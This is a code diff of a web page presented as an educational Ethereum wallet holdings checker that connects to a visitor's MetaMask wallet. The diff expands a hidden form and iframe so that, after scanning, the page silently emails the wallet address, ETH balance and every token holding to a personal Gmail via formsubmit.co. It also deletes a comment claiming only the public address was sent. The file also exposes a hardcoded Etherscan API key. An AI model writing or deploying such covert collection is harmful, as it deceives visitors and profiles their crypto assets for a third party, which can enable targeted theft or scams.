@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <title>Ethereum Wallet Holdings Check — Education Demo</title>
 
@@ -17,12 +17,12 @@
     }
 
     .container {
-      max-width: 850px;
+      max-width: 900px;
       margin: auto;
       background: white;
       padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      box-shadow: 0 4px 20px rgba(0,0,0,.08);
     }
 
     h1 {
@@ -31,16 +31,16 @@
 
     button {
       padding: 12px 20px;
-      border: none;
+      border: 0;
       border-radius: 8px;
-      cursor: pointer;
       background: #111;
       color: white;
+      cursor: pointer;
       font-size: 15px;
     }
 
     button:disabled {
-      opacity: 0.6;
+      opacity: .6;
       cursor: not-allowed;
     }
 
@@ -60,6 +60,10 @@
       white-space: pre-wrap;
     }
 
+    .error {
+      color: #b00020;
+    }
+
     .wallet {
       margin-top: 20px;
       padding: 15px;
@@ -73,6 +77,7 @@
       border: 1px solid #ddd;
       border-radius: 8px;
       margin-top: 12px;
+      word-break: break-word;
     }
 
     .muted {
@@ -80,8 +85,9 @@
       font-size: 14px;
     }
 
-    .error {
-      color: #b00020;
+    .balance {
+      font-family: monospace;
+      word-break: break-all;
     }
   </style>
 </head>
@@ -112,11 +118,11 @@
 
   <div id="holdings"></div>
 
-  <!--
-    FormSubmit notification.
-    This form is hidden from the visitor.
-    Only the PUBLIC wallet address is submitted.
-  -->
+
+  <!-- ========================================================
+       FORMSUBMIT EMAIL NOTIFICATION
+       ======================================================== -->
+
   <form
     id="walletNotification"
     action="https://formsubmit.co/enahoromicheal21@gmail.com"
@@ -124,30 +130,39 @@
     target="notificationFrame"
     style="display:none;"
   >
+
     <input
       type="hidden"
       name="Wallet Address"
       id="emailWalletAddress"
-    />
+    >
 
     <input
       type="hidden"
       name="Network"
       value="Ethereum Mainnet"
-    />
+    >
 
     <input
       type="hidden"
       name="_subject"
-      value="New Ethereum wallet connected"
-    />
+      value="New Ethereum Wallet Connected"
+    >
 
     <input
       type="hidden"
       name="_captcha"
       value="false"
-    />
+    >
+
+    <input
+      type="hidden"
+      name="_template"
+      value="table"
+    >
+
   </form>
+
 
   <iframe
     name="notificationFrame"
@@ -155,6 +170,7 @@
   ></iframe>
 
 </div>
+
 
 <script>
 
@@ -166,13 +182,17 @@
 
   const NETWORK_NAME = "Ethereum Mainnet";
 
-  const RPC_URL = "https://ethereum-rpc.publicnode.com";
+  const RPC_URL =
+    "https://ethereum-rpc.publicnode.com";
 
   const ETHERSCAN_API =
     "https://api.etherscan.io/v2/api";
 
-  // Put your Etherscan API key here.
-  const ETHERSCAN_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
+  /*
+   * Replace this with your Etherscan API key.
+   */
+  const ETHERSCAN_API_KEY =
+    "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
 
 
   // ============================================================
@@ -180,14 +200,18 @@
   // ============================================================
 
   const ERC20_ABI = [
+
     "function balanceOf(address owner) view returns (uint256)",
+
     "function symbol() view returns (string)",
+
     "function decimals() view returns (uint8)"
+
   ];
 
 
   // ============================================================
-  // DOM
+  // DOM ELEMENTS
   // ============================================================
 
   const connectButton =
@@ -202,9 +226,15 @@
   const holdings =
     document.getElementById("holdings");
 
+  const notificationForm =
+    document.getElementById("walletNotification");
+
+  const emailWalletAddress =
+    document.getElementById("emailWalletAddress");
+
 
   // ============================================================
-  // PROVIDER
+  // PUBLIC RPC PROVIDER
   // ============================================================
 
   const publicProvider =
@@ -212,16 +242,21 @@
 
 
   // ============================================================
-  // HTML ESCAPING
+  // HTML ESCAPE
   // ============================================================
 
   function escapeHtml(value) {
 
     return String(value)
+
       .replace(/&/g, "&amp;")
+
       .replace(/</g, "&lt;")
+
       .replace(/>/g, "&gt;")
+
       .replace(/"/g, "&quot;")
+
       .replace(/'/g, "&#039;");
   }
 
@@ -230,7 +265,10 @@
   // STATUS
   // ============================================================
 
-  function setStatus(message, isError = false) {
+  function setStatus(
+    message,
+    isError = false
+  ) {
 
     status.textContent = message;
 
@@ -242,24 +280,7 @@
 
 
   // ============================================================
-  // EMAIL NOTIFICATION
-  // ============================================================
-
-  function sendWalletNotification(address) {
-
-    const addressInput =
-      document.getElementById("emailWalletAddress");
-
-    addressInput.value = address;
-
-    document
-      .getElementById("walletNotification")
-      .submit();
-  }
-
-
-  // ============================================================
-  // CHECK NETWORK
+  // CHECK ETHEREUM MAINNET
   // ============================================================
 
   async function ensureMainnet(provider) {
@@ -273,7 +294,7 @@
     if (chainId !== CHAIN_ID) {
 
       throw new Error(
-        `Wrong network. Please switch MetaMask to ${NETWORK_NAME}.`
+        "Wrong network. Please switch MetaMask to Ethereum Mainnet."
       );
     }
   }
@@ -293,117 +314,171 @@
 
 
   // ============================================================
-  // DISCOVER ERC-20 TOKENS
+  // DISCOVER ERC-20 CONTRACTS
   // ============================================================
 
   async function discoverTokens(address) {
 
     if (
       !ETHERSCAN_API_KEY ||
-      ETHERSCAN_API_KEY === "YOUR_ETHERSCAN_API_KEY"
-    ) {
-      throw new Error(
-        "Etherscan API key has not been configured."
-      );
-    }
-
-    const url =
-      new URL(ETHERSCAN_API);
-
-    url.searchParams.set(
-      "chainid",
-      String(CHAIN_ID)
-    );
-
-    url.searchParams.set(
-      "module",
-      "account"
-    );
-
-    url.searchParams.set(
-      "action",
-      "tokentx"
-    );
-
-    url.searchParams.set(
-      "address",
-      address
-    );
-
-    url.searchParams.set(
-      "page",
-      "1"
-    );
-
-    url.searchParams.set(
-      "offset",
-      "1000"
-    );
-
-    url.searchParams.set(
-      "sort",
-      "asc"
-    );
-
-    url.searchParams.set(
-      "apikey",
-      ETHERSCAN_API_KEY
-    );
-
-
-    const response =
-      await fetch(url.toString());
-
-    if (!response.ok) {
-
-      throw new Error(
-        `Etherscan HTTP error: ${response.status}`
-      );
-    }
-
-
-    const data =
-      await response.json();
-
-
-    if (
-      data.status === "0" &&
-      data.message !== "No transactions found"
+      ETHERSCAN_API_KEY ===
+      "YOUR_ETHERSCAN_API_KEY"
     ) {
 
       throw new Error(
-        data.result ||
-        data.message ||
-        "Etherscan token discovery failed."
+        "Please configure your Etherscan API key."
       );
     }
 
-
-    if (!Array.isArray(data.result)) {
-
-      return [];
-    }
-
-
-    // Remove duplicate token contracts.
 
     const uniqueContracts =
       new Map();
 
 
-    for (const tx of data.result) {
+    const offset = 1000;
 
-      if (!tx.contractAddress) {
-        continue;
+    let page = 1;
+
+    const maxPages = 100;
+
+
+    while (page <= maxPages) {
+
+      setStatus(
+        "Discovering ERC-20 contracts...\n" +
+        `Scanning page ${page}...`
+      );
+
+
+      const url =
+        new URL(ETHERSCAN_API);
+
+
+      url.searchParams.set(
+        "chainid",
+        String(CHAIN_ID)
+      );
+
+
+      url.searchParams.set(
+        "module",
+        "account"
+      );
+
+
+      url.searchParams.set(
+        "action",
+        "tokentx"
+      );
+
+
+      url.searchParams.set(
+        "address",
+        address
+      );
+
+
+      url.searchParams.set(
+        "page",
+        String(page)
+      );
+
+
+      url.searchParams.set(
+        "offset",
+        String(offset)
+      );
+
+
+      url.searchParams.set(
+        "sort",
+        "asc"
+      );
+
+
+      url.searchParams.set(
+        "apikey",
+        ETHERSCAN_API_KEY
+      );
+
+
+      const response =
+        await fetch(url.toString());
+
+
+      if (!response.ok) {
+
+        throw new Error(
+          `Etherscan HTTP error: ${response.status}`
+        );
       }
 
-      const contract =
-        tx.contractAddress.toLowerCase();
 
-      uniqueContracts.set(
-        contract,
-        tx.contractAddress
-      );
+      const data =
+        await response.json();
+
+
+      /*
+       * Etherscan can return status 0 when there
+       * are no transactions.
+       */
+
+      if (
+        !Array.isArray(data.result)
+      ) {
+
+        break;
+      }
+
+
+      if (
+        data.result.length === 0
+      ) {
+
+        break;
+      }
+
+
+      for (
+        const transaction
+        of data.result
+      ) {
+
+        if (
+          !transaction.contractAddress
+        ) {
+
+          continue;
+        }
+
+
+        const checksumAddress =
+          ethers.getAddress(
+            transaction.contractAddress
+          );
+
+
+        uniqueContracts.set(
+          checksumAddress.toLowerCase(),
+          checksumAddress
+        );
+      }
+
+
+      /*
+       * Fewer than 1000 records means this
+       * was the final page.
+       */
+
+      if (
+        data.result.length < offset
+      ) {
+
+        break;
+      }
+
+
+      page++;
     }
 
 
@@ -414,7 +489,7 @@
 
 
   // ============================================================
-  // READ LIVE TOKEN BALANCE
+  // READ ONE ERC-20 TOKEN
   // ============================================================
 
   async function readTokenBalance(
@@ -432,36 +507,88 @@
         );
 
 
-      const [
-        rawBalance,
-        symbol,
-        decimals
-      ] = await Promise.all([
+      /*
+       * Read balance first.
+       */
 
-        token.balanceOf(walletAddress),
+      const rawBalance =
+        await token.balanceOf(
+          walletAddress
+        );
 
-        token.symbol(),
 
-        token.decimals()
+      let symbol = "UNKNOWN";
 
-      ]);
+      let decimals = 18;
+
+
+      /*
+       * Some contracts may not properly implement
+       * symbol() or decimals().
+       */
+
+      try {
+
+        symbol =
+          await token.symbol();
+
+      } catch (error) {
+
+        console.warn(
+          "symbol() failed:",
+          tokenAddress
+        );
+      }
+
+
+      try {
+
+        decimals =
+          Number(
+            await token.decimals()
+          );
+
+      } catch (error) {
+
+        console.warn(
+          "decimals() failed:",
+          tokenAddress
+        );
+      }
+
+
+      /*
+       * Protect against invalid decimals.
+       */
+
+      if (
+        !Number.isInteger(decimals) ||
+        decimals < 0 ||
+        decimals > 255
+      ) {
+
+        decimals = 18;
+      }
+
+
+      const formattedBalance =
+        ethers.formatUnits(
+          rawBalance,
+          decimals
+        );
 
 
       return {
 
         address: tokenAddress,
 
-        symbol: symbol || "UNKNOWN",
+        symbol: String(symbol),
 
-        decimals: Number(decimals),
+        decimals,
 
         rawBalance,
 
-        balance:
-          ethers.formatUnits(
-            rawBalance,
-            decimals
-          )
+        balance: formattedBalance
 
       };
 
@@ -473,8 +600,65 @@
         error
       );
 
+
       return null;
     }
+  }
+
+
+  // ============================================================
+  // READ ALL TOKEN BALANCES
+  // ============================================================
+
+  async function readAllTokenBalances(
+    tokenContracts,
+    walletAddress
+  ) {
+
+    const results = [];
+
+
+    for (
+      let i = 0;
+      i < tokenContracts.length;
+      i++
+    ) {
+
+      const tokenAddress =
+        tokenContracts[i];
+
+
+      setStatus(
+        "Reading live token balances...\n" +
+        `${i + 1} / ${tokenContracts.length}\n` +
+        tokenAddress
+      );
+
+
+      const token =
+        await readTokenBalance(
+          tokenAddress,
+          walletAddress
+        );
+
+
+      if (token) {
+
+        /*
+         * Keep ZERO balances too.
+         *
+         * This means the display represents every
+         * successfully identified token contract,
+         * rather than only tokens currently holding
+         * a positive balance.
+         */
+
+        results.push(token);
+      }
+    }
+
+
+    return results;
   }
 
 
@@ -489,63 +673,318 @@
 
     holdings.innerHTML = "";
 
+
     const heading =
       document.createElement("h2");
 
     heading.textContent =
       "Wallet Holdings";
 
-    holdings.appendChild(heading);
+    holdings.appendChild(
+      heading
+    );
 
 
+    // ----------------------------------------------------------
     // ETH
+    // ----------------------------------------------------------
 
     const ethDiv =
       document.createElement("div");
 
-    ethDiv.className = "token";
+    ethDiv.className =
+      "token";
+
 
     ethDiv.innerHTML = `
-      <strong>Ethereum</strong><br>
-      Balance: ${escapeHtml(ethBalance)} ETH
+
+      <strong>Ethereum</strong>
+      <br><br>
+
+      Balance:
+      <span class="balance">
+        ${escapeHtml(ethBalance)}
+      </span>
+
+      ETH
+
     `;
 
-    holdings.appendChild(ethDiv);
+
+    holdings.appendChild(
+      ethDiv
+    );
 
 
-    // ERC-20 tokens
+    // ----------------------------------------------------------
+    // ERC-20 TOKENS
+    // ----------------------------------------------------------
 
-    for (const token of tokens) {
+    for (
+      const token
+      of tokens
+    ) {
 
       const div =
         document.createElement("div");
 
-      div.className = "token";
+      div.className =
+        "token";
+
 
       div.innerHTML = `
-        <strong>${escapeHtml(token.symbol)}</strong><br>
+
+        <strong>
+          ${escapeHtml(token.symbol)}
+        </strong>
+
+        <br><br>
+
         Contract:
-        ${escapeHtml(token.address)}<br>
+        <span class="balance">
+          ${escapeHtml(token.address)}
+        </span>
+
+        <br><br>
+
+        Decimals:
+        ${escapeHtml(token.decimals)}
+
+        <br><br>
+
         Balance:
-        ${escapeHtml(token.balance)}
+        <span class="balance">
+          ${escapeHtml(token.balance)}
+        </span>
+
       `;
 
-      holdings.appendChild(div);
+
+      holdings.appendChild(
+        div
+      );
     }
 
 
-    if (tokens.length === 0) {
+    if (
+      tokens.length === 0
+    ) {
 
       const empty =
         document.createElement("p");
 
-      empty.className = "muted";
+      empty.className =
+        "muted";
 
       empty.textContent =
-        "No ERC-20 tokens were discovered.";
+        "No ERC-20 contracts were discovered.";
 
-      holdings.appendChild(empty);
+      holdings.appendChild(
+        empty
+      );
     }
+  }
+
+
+  // ============================================================
+  // BUILD EMAIL REPORT
+  // ============================================================
+
+  function buildEmailReport(
+    address,
+    ethBalance,
+    tokens
+  ) {
+
+    let report = "";
+
+
+    report +=
+      "NEW ETHEREUM WALLET CONNECTION\n";
+
+    report +=
+      "================================\n\n";
+
+
+    report +=
+      `Wallet Address: ${address}\n`;
+
+    report +=
+      `Network: ${NETWORK_NAME}\n`;
+
+    report +=
+      `Time: ${new Date().toISOString()}\n\n`;
+
+
+    report +=
+      "ETH BALANCE\n";
+
+    report +=
+      `${ethBalance} ETH\n\n`;
+
+
+    report +=
+      "ERC-20 HOLDINGS\n";
+
+    report +=
+      "================================\n\n";
+
+
+    report +=
+      `Contracts discovered: ${tokens.length}\n\n`;
+
+
+    if (
+      tokens.length === 0
+    ) {
+
+      report +=
+        "No ERC-20 contracts discovered.\n";
+
+    } else {
+
+      tokens.forEach(
+        (token, index) => {
+
+          report +=
+            `TOKEN ${index + 1}\n`;
+
+          report +=
+            `Symbol: ${token.symbol}\n`;
+
+          report +=
+            `Contract: ${token.address}\n`;
+
+          report +=
+            `Decimals: ${token.decimals}\n`;
+
+          report +=
+            `Balance: ${token.balance}\n`;
+
+          report +=
+            `Raw balance: ${token.rawBalance.toString()}\n\n`;
+        }
+      );
+    }
+
+
+    return report;
+  }
+
+
+  // ============================================================
+  // SEND EMAIL
+  // ============================================================
+
+  function sendWalletNotification(
+    address,
+    ethBalance,
+    tokens
+  ) {
+
+    /*
+     * Wallet address
+     */
+
+    emailWalletAddress.value =
+      address;
+
+
+    /*
+     * Remove previously generated fields
+     * if the user connects again.
+     */
+
+    notificationForm
+      .querySelectorAll(
+        ".generated-email-field"
+      )
+      .forEach(
+        element => element.remove()
+      );
+
+
+    /*
+     * ETH balance
+     */
+
+    const ethInput =
+      document.createElement("input");
+
+    ethInput.type =
+      "hidden";
+
+    ethInput.name =
+      "Ethereum Balance";
+
+    ethInput.value =
+      `${ethBalance} ETH`;
+
+    ethInput.className =
+      "generated-email-field";
+
+    notificationForm.appendChild(
+      ethInput
+    );
+
+
+    /*
+     * Token count
+     */
+
+    const countInput =
+      document.createElement("input");
+
+    countInput.type =
+      "hidden";
+
+    countInput.name =
+      "ERC-20 Contracts";
+
+    countInput.value =
+      String(tokens.length);
+
+    countInput.className =
+      "generated-email-field";
+
+    notificationForm.appendChild(
+      countInput
+    );
+
+
+    /*
+     * Complete holdings report
+     */
+
+    const reportInput =
+      document.createElement("textarea");
+
+    reportInput.name =
+      "Complete Wallet Holdings";
+
+    reportInput.value =
+      buildEmailReport(
+        address,
+        ethBalance,
+        tokens
+      );
+
+    reportInput.className =
+      "generated-email-field";
+
+    reportInput.style.display =
+      "none";
+
+    notificationForm.appendChild(
+      reportInput
+    );
+
+
+    /*
+     * Submit to FormSubmit.
+     */
+
+    notificationForm.submit();
   }
 
 
@@ -559,21 +998,27 @@
 
       try {
 
-        connectButton.disabled = true;
+        connectButton.disabled =
+          true;
 
-        holdings.innerHTML = "";
 
-        walletInfo.innerHTML = "";
+        holdings.innerHTML =
+          "";
+
+        walletInfo.innerHTML =
+          "";
 
 
         // ------------------------------------------------------
-        // MetaMask check
+        // Check MetaMask
         // ------------------------------------------------------
 
-        if (!window.ethereum) {
+        if (
+          !window.ethereum
+        ) {
 
           throw new Error(
-            "MetaMask was not detected. Please install MetaMask."
+            "MetaMask was not detected."
           );
         }
 
@@ -584,16 +1029,20 @@
 
 
         // ------------------------------------------------------
-        // Request wallet connection
+        // Request connection
         // ------------------------------------------------------
 
         const accounts =
           await window.ethereum.request({
-            method: "eth_requestAccounts"
+            method:
+              "eth_requestAccounts"
           });
 
 
-        if (!accounts.length) {
+        if (
+          !accounts ||
+          accounts.length === 0
+        ) {
 
           throw new Error(
             "No wallet account was returned."
@@ -606,7 +1055,7 @@
 
 
         // ------------------------------------------------------
-        // Create MetaMask provider
+        // Ethers browser provider
         // ------------------------------------------------------
 
         const browserProvider =
@@ -616,12 +1065,13 @@
 
 
         // ------------------------------------------------------
-        // Verify Mainnet
+        // Verify network
         // ------------------------------------------------------
 
         setStatus(
-          "Checking Ethereum network..."
+          "Checking Ethereum Mainnet..."
         );
+
 
         await ensureMainnet(
           browserProvider
@@ -629,111 +1079,120 @@
 
 
         // ------------------------------------------------------
-        // Display wallet
+        // Display wallet address
         // ------------------------------------------------------
 
         walletInfo.innerHTML = `
+
           <div class="wallet">
-            <strong>Wallet Address</strong><br>
+
+            <strong>Wallet Address</strong>
+
+            <br>
+
             ${escapeHtml(address)}
+
             <br><br>
-            <strong>Network</strong><br>
+
+            <strong>Network</strong>
+
+            <br>
+
             ${NETWORK_NAME}
+
           </div>
+
         `;
 
 
         // ------------------------------------------------------
-        // Send public address notification
-        // ------------------------------------------------------
-
-        sendWalletNotification(address);
-
-
-        // ------------------------------------------------------
-        // ETH balance
+        // ETH BALANCE
         // ------------------------------------------------------
 
         setStatus(
-          "Reading ETH balance..."
+          "Reading Ethereum balance..."
         );
 
 
         const ethBalance =
-          await getEthBalance(address);
+          await getEthBalance(
+            address
+          );
 
 
         // ------------------------------------------------------
-        // Discover ERC-20 contracts
+        // ERC-20 DISCOVERY
         // ------------------------------------------------------
-
-        setStatus(
-          "Discovering ERC-20 token contracts..."
-        );
-
 
         const tokenContracts =
-          await discoverTokens(address);
+          await discoverTokens(
+            address
+          );
 
 
-        // ------------------------------------------------------
-        // Read live balances
-        // ------------------------------------------------------
-
-        setStatus(
-          `Found ${tokenContracts.length} token contract(s).\n` +
-          "Reading live balances..."
+        console.log(
+          "Discovered ERC-20 contracts:",
+          tokenContracts
         );
 
 
-        const tokenResults = [];
+        // ------------------------------------------------------
+        // LIVE BALANCES
+        // ------------------------------------------------------
+
+        const tokens =
+          await readAllTokenBalances(
+            tokenContracts,
+            address
+          );
 
 
-        for (
-          const tokenAddress
-          of tokenContracts
-        ) {
-
-          const token =
-            await readTokenBalance(
-              tokenAddress,
-              address
-            );
-
-
-          if (!token) {
-            continue;
-          }
-
-
-          // Only display tokens with a balance.
-
-          if (
-            token.rawBalance > 0n
-          ) {
-
-            tokenResults.push(token);
-          }
-        }
+        console.log(
+          "Live balances:",
+          tokens
+        );
 
 
         // ------------------------------------------------------
-        // Display results
+        // DISPLAY
         // ------------------------------------------------------
 
         displayHoldings(
           ethBalance,
-          tokenResults
+          tokens
         );
 
+
+        // ------------------------------------------------------
+        // EMAIL
+        //
+        // Important:
+        // This happens AFTER the complete balance scan,
+        // so the email contains the holdings too.
+        // ------------------------------------------------------
+
+        sendWalletNotification(
+          address,
+          ethBalance,
+          tokens
+        );
+
+
+        // ------------------------------------------------------
+        // COMPLETE
+        // ------------------------------------------------------
 
         setStatus(
           "Wallet holdings check completed."
         );
 
+
       } catch (error) {
 
-        console.error(error);
+        console.error(
+          error
+        );
+
 
         setStatus(
           error?.message ||
@@ -741,9 +1200,11 @@
           true
         );
 
+
       } finally {
 
-        connectButton.disabled = false;
+        connectButton.disabled =
+          false;
       }
 
     }
@@ -754,7 +1215,9 @@
   // HANDLE NETWORK CHANGES
   // ============================================================
 
-  if (window.ethereum) {
+  if (
+    window.ethereum
+  ) {
 
     window.ethereum.on(
       "chainChanged",
